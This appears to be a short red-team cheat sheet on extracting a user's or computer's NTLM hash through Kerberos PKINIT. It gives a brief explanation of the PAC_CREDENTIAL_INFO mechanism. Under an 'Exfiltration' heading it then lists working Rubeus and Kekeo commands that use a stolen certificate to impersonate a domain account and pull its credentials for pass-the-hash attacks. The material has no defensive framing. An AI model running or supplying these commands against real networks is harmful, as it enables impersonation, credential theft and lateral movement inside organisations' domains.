## Use the Kerberos PKINIT protocol to retrieve a User/Computer account’s NTLM hash ##

#### What's running under the hood ####
- When using PKINIT to obtain a TGT (Ticket Granting Ticket), the KDC (Key Distribution Center) includes in the ticket a `PAC_CREDENTIAL_INFO` structure containing the NTLM keys (i.e. LM and NT hashes) of the authenticating user.
- This feature allows users to switch to NTLM authentications when remote servers don't support Kerberos, while still relying on an asymmetric Kerberos pre-authentication verification mechanism (i.e. PKINIT).

#### What the attack is about ####
- When we use a certificate to request a TGT in order to impersonate a domain account, we can also extract it's NTLM hash.
- This hash can be used to execute Pass-the-Hash/OverPass-the-Hash attacks.

### Exfiltration ###
1. **Rubeus**
`PS C:\ADCS\Auditor> .\Rubeus.exe asktgt /user:certstore /certificate:C:\ADCS\Auditor\Loot\certstore.pfx /domain:cb.corp /dc:cb-ca.cb.corp /password:certpass /nowrap /ptt /getcredentials`

2. **Kekeo**
`PS C:\ADCS\Auditor> .\kekeo.exe "tgt::pac /caname:thename-DC-CA /subject:harmj0y /castore:current_user /domain:domain.local"`